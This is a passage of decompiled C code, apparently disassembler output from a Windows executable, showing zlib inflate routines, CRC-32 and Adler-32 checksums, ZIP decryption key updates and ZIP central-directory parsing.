      for (; uVar4 < uVar10; uVar4 = uVar4 + 8) {
        local_14 = local_14 + -1;
        uVar15 = uVar15 | (uint)*pbVar12 << ((byte)uVar4 & 0x1f);
        pbVar12 = pbVar11 + 1;
        pbVar11 = pbVar12;
      }
      uVar13 = *(uint *)(&DAT_0041e5e0 + uVar10 * 4) & uVar15;
      uVar15 = uVar15 >> (sbyte)uVar10;
      puVar8 = puVar16 + -(uVar13 + *(int *)(pbVar3 + 4));
      puVar14 = *(undefined **)(param_5 + 0x28);
      uVar4 = uVar4 - uVar10;
      local_10 = local_10 + -uVar6;
      local_c = pbVar11;
      if (puVar8 < puVar14) {
        do {
          puVar8 = puVar8 + (*(int *)(param_5 + 0x2c) - (int)puVar14);
        } while (puVar8 < puVar14);
        uVar10 = *(int *)(param_5 + 0x2c) - (int)puVar8;
        if (uVar10 < uVar6) {
          iVar7 = uVar6 - uVar10;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
          puVar14 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
        else {
          *puVar16 = *puVar8;
          puVar16[1] = puVar8[1];
          puVar16 = puVar16 + 2;
          puVar8 = puVar8 + 2;
          iVar7 = uVar6 - 2;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
      }
      else {
        *puVar16 = *puVar8;
        puVar16[1] = puVar8[1];
        puVar16 = puVar16 + 2;
        puVar8 = puVar8 + 2;
        iVar7 = uVar6 - 2;
        do {
          *puVar16 = *puVar8;
          puVar16 = puVar16 + 1;
          puVar8 = puVar8 + 1;
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
      uVar9 = (int)param_6[1] - (int)local_14;
      if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
        uVar9 = uVar4 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
      param_6[1] = local_14 + uVar9;
      pbVar3 = *param_6;
      *param_6 = pbVar11 + -uVar9;
      param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_00407c40(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 != (byte *)0x0) {
    uVar1 = ~in_EAX;
    if (7 < param_2) {
      uVar2 = param_2 >> 3;
      do {
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((*param_1 ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[1] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[2] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[3] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[4] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[5] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[6] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((param_1[7] ^ uVar1) & 0xff) * 4);
        param_1 = param_1 + 8;
        param_2 = param_2 - 8;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    for (; param_2 != 0; param_2 = param_2 - 1) {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((*param_1 ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 1;
    }
    return ~uVar1;
  }
  return 0;
}



void __fastcall FUN_00407d50(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0041f998 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_0041f998 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_00407da0(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_0041f998 +
                   (((int)(char)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) * 4
                   ) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_0041f998 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_00407e10(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void FUN_00407f50(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_0040c0f1(param_2,param_3);
  return;
}



undefined4 FUN_00407f80(void)

{
  uint *puVar1;
  int *piVar2;
  int iVar3;
  int unaff_EDI;
  
  if ((unaff_EDI != 0) && (puVar1 = *(uint **)(unaff_EDI + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(unaff_EDI + 0x14) = 0;
    *(undefined4 *)(unaff_EDI + 8) = 0;
    *(undefined4 *)(unaff_EDI + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    piVar2 = *(int **)(*(int *)(unaff_EDI + 0x1c) + 0x14);
    if ((*piVar2 == 4) || (*piVar2 == 5)) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[3]);
    }
    if (*piVar2 == 6) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[1]);
    }
    piVar2[0xd] = piVar2[10];
    piVar2[0xc] = piVar2[10];
    *piVar2 = 0;
    piVar2[7] = 0;
    piVar2[8] = 0;
    if ((code *)piVar2[0xe] != (code *)0x0) {
      iVar3 = (*(code *)piVar2[0xe])(0,0,0);
      piVar2[0xf] = iVar3;
      *(int *)(unaff_EDI + 0x30) = iVar3;
    }
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00408010(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_004071b0();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00408060(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  if (in_EAX == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(in_EAX + 0x18) = 0;
  if (*(int *)(in_EAX + 0x20) == 0) {
    *(code **)(in_EAX + 0x20) = FUN_00407f50;
    *(undefined4 *)(in_EAX + 0x28) = 0;
  }
  if (*(int *)(in_EAX + 0x24) == 0) {
    *(undefined **)(in_EAX + 0x24) = &LAB_00407f70;
  }
  iVar1 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x18);
  *(int *)(in_EAX + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_004066e0(~-(uint)(*(int *)(*(int *)(in_EAX + 0x1c) + 0xc) != 0) & 0x407e10);
    *(undefined4 **)(*(int *)(in_EAX + 0x1c) + 0x14) = puVar2;
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00407f80();
      return 0;
    }
    FUN_00408010();
  }
  return 0xfffffffc;
}



int FUN_00408110(void)

{
  byte bVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  byte **in_EAX;
  int iVar5;
  
  if (((in_EAX != (byte **)0x0) && ((uint *)in_EAX[7] != (uint *)0x0)) && (*in_EAX != (byte *)0x0))
  {
    iVar5 = -5;
    uVar2 = *(uint *)in_EAX[7];
    while (uVar2 < 0xe) {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 4) = (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        uVar3 = puVar4[1];
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if (((byte)uVar3 & 0xf) == 8) {
          if (((uint)puVar4[1] >> 4) + 8 <= (uint)puVar4[4]) {
            *puVar4 = 1;
            goto switchD_00408146_caseD_1;
          }
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_invalid_window_size_0041ff78;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_unknown_compression_method_0041ff5c;
        }
        goto LAB_00408340;
      case 1:
switchD_00408146_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar4 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if ((puVar4[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
          if ((bVar1 & 0x20) != 0) {
            *(undefined4 *)in_EAX[7] = 2;
            goto switchD_00408146_caseD_2;
          }
          *puVar4 = 7;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_incorrect_header_check_0041ff8c;
          *(undefined4 *)(in_EAX[7] + 4) = 5;
        }
        break;
      case 2:
switchD_00408146_caseD_2:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
      case 3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          iVar5 = 0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_00408146_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            iVar5 = 0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_00408146_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return 2;
            }
          }
        }
        return iVar5;
      case 4:
        goto switchD_00408146_caseD_4;
      case 5:
        goto switchD_00408146_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)s_need_dictionary_0041e004;
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return -2;
      case 7:
        iVar5 = FUN_00406780(*(void **)(in_EAX[7] + 0x14),iVar5);
        if (iVar5 == -3) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
          iVar5 = -3;
        }
        else {
          if (iVar5 == 0) {
            return 0;
          }
          if (iVar5 != 1) {
            return iVar5;
          }
          iVar5 = 0;
          FUN_00406670();
          puVar4 = (undefined4 *)in_EAX[7];
          if (puVar4[3] == 0) {
            *puVar4 = 8;
            goto switchD_00408146_caseD_8;
          }
          *puVar4 = 0xc;
        }
        break;
      case 8:
switchD_00408146_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_00408146_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_00408146_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar4[1] == puVar4[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_00408146_caseD_c:
          return 1;
        }
        *puVar4 = 0xd;
        in_EAX[6] = (byte *)s_incorrect_data_check_0041ffa4;
LAB_00408340:
        iVar5 = 0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_00408146_caseD_a;
      case 0xb:
        goto switchD_00408146_caseD_b;
      case 0xc:
        goto switchD_00408146_caseD_c;
      case 0xd:
        return -3;
      }
      uVar2 = *(uint *)in_EAX[7];
    }
  }
  return -2;
}



uint __fastcall FUN_004084b0(undefined4 param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  BOOL BVar2;
  uint unaff_EBX;
  uint nNumberOfBytesToRead;
  char *unaff_EDI;
  
  nNumberOfBytesToRead = unaff_EBX * param_3;
  if (*unaff_EDI != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(unaff_EDI + 4),param_2,nNumberOfBytesToRead,&param_3,
                     (LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_EDI[8] = '\x01';
    }
    return param_3 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x1c);
  if (*(uint *)(unaff_EDI + 0x18) < iVar1 + nNumberOfBytesToRead) {
    nNumberOfBytesToRead = *(uint *)(unaff_EDI + 0x18) - iVar1;
  }
  FUN_00410450(param_2,(undefined4 *)(*(int *)(unaff_EDI + 0x14) + iVar1),nNumberOfBytesToRead);
  *(uint *)(unaff_EDI + 0x1c) = *(int *)(unaff_EDI + 0x1c) + nNumberOfBytesToRead;
  return nNumberOfBytesToRead / unaff_EBX;
}



undefined4 __cdecl FUN_00408510(uint *param_1)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  uint uVar3;
  undefined local_5;
  uint local_4;
  
  uVar3 = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x1c);
    if (*(uint *)(unaff_ESI + 0x18) < iVar1 + 1U) {
      uVar3 = *(uint *)(unaff_ESI + 0x18) - iVar1;
    }
    FUN_00410450((undefined4 *)&local_5,(undefined4 *)(*(int *)(unaff_ESI + 0x14) + iVar1),uVar3);
    *(uint *)(unaff_ESI + 0x1c) = iVar1 + uVar3;
    local_4 = uVar3;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 4),&local_5,1,&local_4,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[8] = '\x01';
    }
  }
  if (local_4 == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*unaff_ESI != '\0') && (unaff_ESI[8] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_004085a0(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_4;
  
  iVar2 = FUN_00408510(&local_4);
  uVar1 = local_4;
  if (iVar2 == 0) {
    iVar2 = FUN_00408510(&local_4);
  }
  iVar4 = local_4 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00408510(&local_4);
  }
  iVar3 = local_4 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_00408510(&local_4);
    if (iVar2 == 0) {
      *unaff_EBX = local_4 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int FUN_00408620(void)

{
  int iVar1;
  DWORD DVar2;
  undefined4 *lpBuffer;
  uint uVar3;
  BOOL BVar4;
  int iVar5;
  uint uVar6;
  char *unaff_ESI;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  uint uStack_8;
  int iStack_4;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x1c) = *(undefined4 *)(unaff_ESI + 0x18);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,2);
  }
  if (*unaff_ESI == '\0') {
    uStack_18 = *(uint *)(unaff_ESI + 0x1c);
  }
  else if (unaff_ESI[1] == '\0') {
    uStack_18 = 0;
  }
  else {
    DVar2 = SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,1);
    uStack_18 = DVar2 - *(int *)(unaff_ESI + 0xc);
  }
  uStack_14 = 0xffff;
  if (uStack_18 < 0xffff) {
    uStack_14 = uStack_18;
  }
  lpBuffer = (undefined4 *)FUN_0040afc0(0x404);
  if (lpBuffer == (undefined4 *)0x0) {
    return -1;
  }
  uStack_10 = 4;
  iStack_c = -1;
  if (uStack_14 < 5) {
LAB_004087d1:
    FUN_0040b61e();
    return iStack_c;
  }
  do {
    uVar3 = uStack_10 + 0x400;
    uStack_10 = uStack_14;
    if (uVar3 <= uStack_14) {
      uStack_10 = uVar3;
    }
    iStack_4 = uStack_18 - uStack_10;
    uVar3 = uStack_18 - iStack_4;
    if (0x404 < uVar3) {
      uVar3 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x1c) = iStack_4;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_004087d1;
      SetFilePointer(*(HANDLE *)(unaff_ESI + 4),*(int *)(unaff_ESI + 0xc) + iStack_4,(PLONG)0x0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar5 = *(int *)(unaff_ESI + 0x1c);
      uVar6 = uVar3;
      if (*(uint *)(unaff_ESI + 0x18) < iVar5 + uVar3) {
        uVar6 = *(uint *)(unaff_ESI + 0x18) - iVar5;
      }
      FUN_00410450(lpBuffer,(undefined4 *)(*(int *)(unaff_ESI + 0x14) + iVar5),uVar6);
      *(uint *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + uVar6;
    }
    else {
      BVar4 = ReadFile(*(HANDLE *)(unaff_ESI + 4),lpBuffer,uVar3,&uStack_8,(LPOVERLAPPED)0x0);
      uVar6 = uStack_8;
      if (BVar4 == 0) {
        unaff_ESI[8] = '\x01';
      }
    }
    if (uVar6 / uVar3 != 1) goto LAB_004087d1;
    iVar5 = uVar3 - 3;
    do {
      iVar1 = iVar5;
      if (iVar1 < 0) goto LAB_004087bc;
      iVar5 = iVar1 + -1;
    } while ((((*(char *)(iVar5 + (int)lpBuffer) != 'P') ||
              (*(char *)(iVar1 + (int)lpBuffer) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)lpBuffer) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)lpBuffer) != '\x06'));
    iStack_c = iVar5 + iStack_4;
LAB_004087bc:
    if ((iStack_c != 0) || (uStack_14 <= uStack_10)) goto LAB_004087d1;
  } while( true );
}



int * FUN_004087f0(void)

{
  uint uVar1;
  char *in_EAX;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int *piVar8;
  uint uStack_94;
  int local_90;
  int local_8c;
  int local_88;
  int aiStack_84 [7];
  int iStack_68;
  int iStack_64;
  int iStack_60;
  undefined4 uStack_8;
  
  if (in_EAX == (char *)0x0) {
    return (int *)0x0;
  }
  local_90 = 0;
  local_88 = FUN_00408620();
  if (local_88 == -1) {
    local_90 = -1;
  }
  if (*in_EAX == '\0') {
    *(int *)(in_EAX + 0x1c) = local_88;
  }
  else if (in_EAX[1] == '\0') {
    local_90 = -1;
  }
  else {
    SetFilePointer(*(HANDLE *)(in_EAX + 4),*(int *)(in_EAX + 0xc) + local_88,(PLONG)0x0,0);
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00408510(&uStack_94);
  uVar1 = uStack_94;
  iVar6 = 0;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&uStack_94), iVar2 == 0)) {
    local_8c = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_8c = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = FUN_00408510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&uStack_94), iVar2 == 0)) {
    iVar6 = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_90 = -1;
  }
  iVar2 = FUN_00408510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&uStack_94), iVar2 == 0)) {
    aiStack_84[1] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[1] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = aiStack_84[1];
  iVar3 = FUN_00408510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar3 == 0) && (iVar3 = FUN_00408510(&uStack_94), iVar3 == 0)) {
    iVar5 = uStack_94 * 0x100 + uVar1;
  }
  else {
    iVar5 = 0;
    if (iVar3 != 0) {
      local_90 = -1;
    }
  }
  if (((iVar5 != iVar2) || (iVar6 != 0)) || (local_8c != 0)) {
    local_90 = -0x67;
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_004085a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00408510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&uStack_94), iVar2 == 0)) {
    aiStack_84[2] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[2] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  if (((uint)(iStack_64 + iStack_60) <= (uint)(*(int *)(in_EAX + 0xc) + local_88)) &&
     (local_90 == 0)) {
    aiStack_84[3] = ((*(int *)(in_EAX + 0xc) - iStack_64) - iStack_60) + local_88;
    iStack_68 = local_88;
    uStack_8 = 0;
    *(undefined4 *)(in_EAX + 0xc) = 0;
    piVar4 = (int *)FUN_0040afc0(0x80);
    piVar7 = aiStack_84;
    piVar8 = piVar4;
    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
      *piVar8 = *piVar7;
      piVar7 = piVar7 + 1;
      piVar8 = piVar8 + 1;
    }
    FUN_00408ed0();
    return piVar4;
  }
  if (in_EAX[0x10] != '\0') {
    CloseHandle(*(HANDLE *)(in_EAX + 4));
  }
  FUN_0040b6ac();
  return (int *)0x0;
}



int __cdecl FUN_00408a80(int *param_1,uint *param_2,undefined4 *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c;
  uint local_58;
  int aiStack_54 [4];
  uint uStack_44;
  uint uStack_34;
  int iStack_30;
  int iStack_2c;
  int iStack_28;
  int iStack_24;
  int iStack_1c;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  int iStack_8;
  
  local_5c = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x1c) = in_EAX[5] + (int)in_EAX[3];
  }
  else {
    if (pcVar1[1] == '\0') {
      local_5c = -1;
      goto LAB_00408aff;
    }
    SetFilePointer(*(HANDLE *)(pcVar1 + 4),
                   (LONG)(in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 0xc)),(PLONG)0x0,0);
  }
  iVar2 = FUN_004085a0();
  if (iVar2 == 0) {
    if (local_58 != 0x2014b50) {
      local_5c = -0x67;
    }
  }
  else {
    local_5c = -1;
  }
LAB_00408aff:
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    aiStack_54[0] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[0] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    aiStack_54[1] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[1] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    aiStack_54[2] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[2] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408510(&local_58), iVar2 == 0)) {
    aiStack_54[3] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[3] = 0;
